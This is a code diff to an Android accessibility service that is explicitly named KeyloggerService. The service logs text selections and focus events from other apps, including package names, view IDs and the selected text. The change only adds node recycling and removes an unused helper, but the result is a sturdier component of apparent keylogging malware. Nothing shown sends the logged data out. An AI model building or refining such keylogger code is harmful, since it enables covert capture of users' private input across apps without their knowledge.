@@ -57,10 +57,16 @@ public class KeyloggerService extends AccessibilityService {
 
         if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
             AccessibilityNodeInfo source = event.getSource();
-            if (source != null && source.getText() != null) {
-                dataManager.logEntry(timestamp, "TEXT_SELECTION", packageName, className,
-                    safeString(source.getViewIdResourceName()),
-                    source.getText().toString(), "");
+            if (source != null) {
+                try {
+                    if (source.getText() != null) {
+                        dataManager.logEntry(timestamp, "TEXT_SELECTION", packageName, className,
+                            safeString(source.getViewIdResourceName()),
+                            source.getText().toString(), "");
+                    }
+                } finally {
+                    source.recycle();
+                }
             }
             return;
         }
@@ -74,8 +80,12 @@ public class KeyloggerService extends AccessibilityService {
         if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             AccessibilityNodeInfo source = event.getSource();
             if (source != null) {
-                dataManager.logEntry(timestamp, "FOCUS", packageName, className,
-                    safeString(source.getViewIdResourceName()), "", "");
+                try {
+                    dataManager.logEntry(timestamp, "FOCUS", packageName, className,
+                        safeString(source.getViewIdResourceName()), "", "");
+                } finally {
+                    source.recycle();
+                }
             }
             return;
         }
@@ -103,15 +113,6 @@ public class KeyloggerService extends AccessibilityService {
 
     private String safeString(CharSequence cs) {
         return cs != null ? cs.toString() : "";
-    }
-
-    private String safeString(Object[] arr) {
-        if (arr == null || arr.length == 0) return "";
-        StringBuilder sb = new StringBuilder();
-        for (Object o : arr) {
-            if (o != null) sb.append(o.toString());
-        }
-        return sb.toString();
     }
 
     private String safeString(java.util.List<CharSequence> list) {
